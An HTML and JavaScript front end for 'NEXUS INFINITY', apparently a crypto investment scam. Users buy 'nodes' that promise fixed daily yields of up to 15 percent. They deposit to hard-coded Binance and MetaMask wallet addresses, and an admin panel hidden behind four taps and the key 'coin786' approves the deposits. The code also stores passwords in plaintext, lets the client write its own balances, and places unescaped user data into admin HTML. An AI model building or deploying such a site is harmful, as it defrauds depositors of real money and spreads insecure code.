<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Master Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        
        :root { 
            --neon-pink: #ff00ff; 
            --neon-blue: #00d4ff;
            --soft-white: #f8f9fa;
            --glass-light: rgba(255, 255, 255, 0.07);
        }

        body { 
            background: radial-gradient(circle at top right, #1a1a2e, #050505); 
            color: var(--soft-white); 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            margin: 0; 
            overflow-x: hidden; 
        }

        /* Light Glass Effect */
        .glass-card { 
            background: var(--glass-light); 
            backdrop-filter: blur(25px); 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            border-radius: 30px; 
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
        }

        .neon-btn { 
            background: linear-gradient(135deg, var(--neon-pink), #ff003c); 
            box-shadow: 0 8px 25px rgba(255, 0, 255, 0.3);
            border-radius: 20px; 
            transition: 0.4s ease;
        }

        .neon-btn:hover { transform: scale(1.02); filter: brightness(1.2); }

        .nav-active { color: var(--neon-pink); text-shadow: 0 0 10px var(--neon-pink); }
        .hidden { display: none !important; }

        /* Smooth UI Animations */
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-ui { animation: fadeIn 0.6s ease forwards; }
    </style>
</head>
<body>

    <div id="splash" class="fixed inset-0 bg-[#050505] z-[10000] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-pink-500 to-indigo-600 rounded-[2.5rem] flex items-center justify-center shadow-[0_0_50px_rgba(255,0,255,0.4)] animate-pulse">
            <span class="text-5xl font-black text-white italic">N</span>
        </div>
        <h1 style="font-family: 'Syncopate'" class="mt-8 text-xs tracking-[0.6em] text-white">NEXUS<span class="text-pink-500">INFINITY</span></h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="max-w-sm w-full space-y-8 animate-ui">
            <div class="text-center">
                <h2 style="font-family: 'Syncopate'" class="text-lg tracking-widest font-black italic uppercase">Institutional<br><span class="text-pink-500">Access Hub</span></h2>
            </div>
            
            <div id="login-ui" class="glass-card p-10 space-y-5">
                <input type="text" id="l-user" placeholder="Account ID" class="w-full p-5 bg-white/5 border border-white/10 rounded-2xl outline-none focus:border-pink-500 transition">
                <input type="password" id="l-pass" placeholder="Security Key" class="w-full p-5 bg-white/5 border border-white/10 rounded-2xl outline-none focus:border-pink-500 transition">
                <button onclick="handleLogin()" class="w-full p-5 neon-btn font-black uppercase tracking-widest text-sm">Authorize Connection</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-zinc-500 font-bold uppercase cursor-pointer">Initialize New Terminal ID</p>
            </div>

            <div id="signup-ui" class="glass-card p-10 space-y-5 hidden">
                <input type="text" id="s-user" placeholder="Create Identity" class="w-full p-5 bg-white/5 border border-white/10 rounded-2xl outline-none focus:border-pink-500 transition">
                <input type="password" id="s-pass" placeholder="Security Key" class="w-full p-5 bg-white/5 border border-white/10 rounded-2xl outline-none focus:border-pink-500 transition">
                <button onclick="handleSignup()" class="w-full p-5 neon-btn font-black uppercase tracking-widest text-sm italic">Finalize Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-bold uppercase cursor-pointer">Back to Login</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-[#050505]/60 backdrop-blur-xl z-50 border-b border-white/5">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-white/5 rounded-xl flex items-center justify-center font-black border border-white/10 italic">N</div>
                <div>
                    <p id="nav-user" class="text-xs font-black uppercase text-pink-500 leading-none">...</p>
                    <p class="text-[7px] text-green-500 font-black uppercase tracking-widest mt-1 animate-pulse">● Grid Active</p>
                </div>
            </div>
            <button onclick="logout()" class="text-zinc-500"><i class="fa-solid fa-power-off text-xl"></i></button>
        </header>

        <main id="page-core" class="p-6 space-y-6 animate-ui">
            <div class="glass-card p-8 bg-gradient-to-br from-white/5 to-transparent relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[8px] font-black text-zinc-400 uppercase tracking-widest mb-1">Total Institutional Equity</p>
                    <h2 id="balance-txt" class="text-5xl font-extrabold italic tracking-tighter">$0</h2>
                    <div class="mt-8 flex justify-between items-end">
                        <div>
                            <p class="text-[7px] text-zinc-500 uppercase font-black">Yield Accumulation</p>
                            <p id="profit-txt" class="text-xl font-black text-pink-500">+$0</p>
                        </div>
                        <div class="text-right">
                            <p class="text-[7px] text-zinc-500 uppercase font-black">Nodes Deployed</p>
                            <p id="node-count" class="text-xl font-black text-blue-400">0</p>
                        </div>
                    </div>
                </div>
            </div>

            <section class="space-y-4">
                <h3 class="text-[10px] font-black text-zinc-600 uppercase tracking-[0.2em] ml-2">Deployed Infrastructure</h3>
                <div id="active-nodes" class="grid gap-4"></div>
            </section>
        </main>

        <main id="page-market" class="p-6 space-y-4 hidden animate-ui">
            <h3 class="text-xl font-black italic uppercase text-pink-500">Infrastructure Core</h3>
            <div id="market-list" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden animate-ui">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-lg font-black italic text-pink-500 uppercase">Capital Injection</h3>
                <div class="space-y-3">
                    <div class="bg-white/5 p-4 rounded-2xl flex justify-between items-center"><span class="text-[8px] font-black opacity-40 uppercase">Binance Pay</span><span class="text-[10px] font-bold select-all">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</span></div>
                    <div class="bg-white/5 p-4 rounded-2xl flex justify-between items-center"><span class="text-[8px] font-black opacity-40 uppercase">Metamask</span><span class="text-[10px] font-bold select-all">0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</span></div>
                </div>
                <input type="number" id="dep-amt" placeholder="Injection Amount ($)" class="w-full p-5 bg-white/5 border border-white/10 rounded-2xl outline-none">
                <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="w-full p-5 bg-white/5 border border-white/10 rounded-2xl outline-none">
                <div class="space-y-2">
                    <p class="text-[8px] font-black text-zinc-500 uppercase ml-2">Upload Digital Signature (Proof)</p>
                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] file:bg-pink-500/10 file:border-0 file:text-pink-500 file:px-4 file:py-2 file:rounded-full">
                    <img id="preview-img" class="mt-4 w-full h-32 rounded-2xl border border-white/10 object-cover hidden">
                </div>
                <button onclick="submitDeposit()" class="w-full p-5 neon-btn font-black uppercase text-xs">Execute Protocol</button>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-black/60 backdrop-blur-2xl border-t border-white/5 flex justify-around items-center z-[100]">
            <div onclick="switchPage('core')" class="nav-btn nav-active flex flex-col items-center gap-1 cursor-pointer"><i class="fa-solid fa-house-chimney-window text-xl"></i><span class="text-[8px] font-black uppercase">Core</span></div>
            <div onclick="switchPage('market')" class="nav-btn flex flex-col items-center gap-1 cursor-pointer text-zinc-600"><i class="fa-solid fa-microchip text-xl"></i><span class="text-[8px] font-black uppercase">Market</span></div>
            <div onclick="switchPage('vault')" class="nav-btn flex flex-col items-center gap-1 cursor-pointer text-zinc-600"><i class="fa-solid fa-vault text-xl"></i><span class="text-[8px] font-black uppercase">Vault</span></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[1000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-xl font-black italic text-pink-500">GRID CONTROL</h2><button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl">&times;</button></div>
        <div id="admin-list" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const nodesMeta = [
            { id: 1, title: "Standard Node S-1", price: 20, daily: 2, days: 30 },
            { id: 2, title: "Pro Infrastructure P-5", price: 100, daily: 12, days: 30 },
            { id: 3, title: "Apex Elite Hub", price: 1000, daily: 150, days: 60 }
        ];

        window.onload = () => {
            renderMarket();
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const user = localStorage.getItem('nexus_user');
                if(user) showDashboard(user);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function renderMarket() {
            document.getElementById('market-list').innerHTML = nodesMeta.map(n => `
                <div class="glass-card p-6 flex justify-between items-center">
                    <div><h4 class="text-lg font-black italic italic">${n.title}</h4><p class="text-[9px] font-bold text-pink-500">Yield: $${n.daily}/Day • ${n.days} Days</p></div>
                    <div class="text-right"><p class="text-xl font-black">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-2 px-6 py-2 bg-white text-black text-[9px] font-black uppercase rounded-xl">Deploy</button></div>
                </div>`).join('');
        }

        // --- BUY NODE LOGIC ---
        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user');
            const node = nodesMeta.find(x => x.id === id);
            const snap = await get(ref(db, `users/${user}`));
            if((snap.val().balance || 0) < node.price) return alert("Insufficient Capital!");

            const startTime = Date.now();
            await update(ref(db, `users/${user}`), { balance: snap.val().balance - node.price });
            await set(push(ref(db, `users/${user}/nodes`)), { ...node, startTime, expires: startTime + (node.days * 24 * 60 * 60 * 1000), lastClaim: startTime });
            alert("Infrastructure Deployed!"); switchPage('core');
        };

        // --- CORE UI & PROFIT SYSTEM ---
        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val(); if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                
                const nodes = data.nodes ? Object.entries(data.nodes) : [];
                document.getElementById('node-count').innerText = nodes.length;
                
                document.getElementById('active-nodes').innerHTML = nodes.map(([k, n]) => {
                    const remaining = Math.max(0, n.expires - Date.now());
                    const hours = Math.floor(remaining / (1000 * 60 * 60));
                    
                    // Auto Profit Claim (Logic: 24h cycle)
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (data.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }

                    return `
                        <div class="glass-card p-6 border-l-4 border-blue-500">
                            <div class="flex justify-between items-center">
                                <div><p class="text-xs font-black uppercase italic">${n.title}</p><p class="text-[9px] text-zinc-500">Active Distribution</p></div>
                                <div class="text-right"><p class="text-[9px] font-black text-blue-400 animate-pulse uppercase">Online</p><p class="text-[8px] font-bold mt-1">${hours}h Remaining</p></div>
                            </div>
                        </div>`;
                }).join('') || '<p class="text-center opacity-20 uppercase font-black text-[9px] py-10">No Active Infrastructure</p>';
            });
        }

        // --- ADMIN UNLIMITED SYSTEM ---
        window.loadAdmin = () => {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const reqs = snap.val();
                document.getElementById('admin-list').innerHTML = reqs ? Object.entries(reqs).map(([id, r]) => `
                    <div class="glass-card p-6 space-y-4 border border-pink-500/20">
                        <div class="flex justify-between items-center"><span class="text-[9px] font-black text-pink-500 uppercase">${r.type}</span><span class="text-[8px] opacity-30">${r.date}</span></div>
                        <p class="text-xs">User: <span class="font-black italic">${r.user}</span> | Amount: <span class="text-green-500 font-black">$${r.amount}</span></p>
                        <img src="${r.proof}" class="w-full h-40 object-cover rounded-2xl border border-white/10" onclick="window.open(this.src)">
                        <div class="grid grid-cols-2 gap-3">
                            <button onclick="manageRequest('${id}','${r.user}',${r.amount},'${r.hKey}','approve')" class="bg-green-600/20 text-green-500 p-4 rounded-2xl text-[9px] font-black uppercase">Approve</button>
                            <button onclick="manageRequest('${id}','${r.user}',${r.amount},'${r.hKey}','reject')" class="bg-red-600/20 text-red-500 p-4 rounded-2xl text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`).join('') : '<p class="text-center opacity-30 uppercase font-black text-[10px] py-20">Grid Secure: No Pending Tasks</p>';
            });
        };

        window.manageRequest = async (adminKey, user, amt, hKey, action) => {
            if(action === 'approve') {
                const snap = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (snap.val().balance || 0) + parseFloat(amt) });
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Authorized' });
            } else {
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' });
            }
            await remove(ref(db, `admin/requests/${adminKey}`));
            alert(`Protocol ${action.toUpperCase()} Successful`);
        };

        // --- UTILITIES ---
        window.submitDeposit = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const proof = document.getElementById('preview-img').src; // Base64
            if(!amt || !tid || !proof) return alert("Incomplete Protocol Data!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, `admin/requests/${hRef.key}`), entry);
            alert("Capital Logged for Verification!");
        };

        document.getElementById('dep-proof').onchange = (e) => {
            const r = new FileReader(); r.readAsDataURL(e.target.files[0]);
            r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); };
        };

        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['core','market','vault'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('nav-active','text-zinc-600')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(); const snap = await get(ref(db, `users/${u}`)); if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied!"); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(); await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); alert("Identity Finalized!"); toggleAuth(false); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
